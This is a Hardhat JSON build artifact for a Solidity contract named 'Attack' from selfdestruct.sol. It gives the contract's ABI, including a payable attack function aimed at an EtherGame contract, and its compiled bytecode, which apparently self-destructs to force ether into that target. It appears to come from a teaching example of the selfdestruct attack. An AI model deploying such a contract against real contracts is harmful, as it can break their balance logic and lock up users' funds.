{
  "_format": "hh-sol-artifact-1",
  "contractName": "Attack",
  "sourceName": "contracts/selfdestruct.sol",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "contract EtherGame",
          "name": "_etherGame",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b506040516101bd3803806101bd8339818101604052810190610032919061008d565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610111565b600081519050610087816100fa565b92915050565b60006020828403121561009f57600080fd5b60006100ad84828501610078565b91505092915050565b60006100c1826100da565b9050919050565b60006100d3826100b6565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b610103816100c8565b811461010e57600080fd5b50565b609e8061011f6000396000f3fe608060405260043610601c5760003560e01c80639e5faafc146021575b600080fd5b60276029565b005b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1690508073ffffffffffffffffffffffffffffffffffffffff16fffea26469706673582212206b736d46e0d42e1762504acaebf878c64001ce4bb39b99345274dc77c7a4999b64736f6c63430008040033",
  "linkReferences": {},
  "deployedLinkReferences": {}
}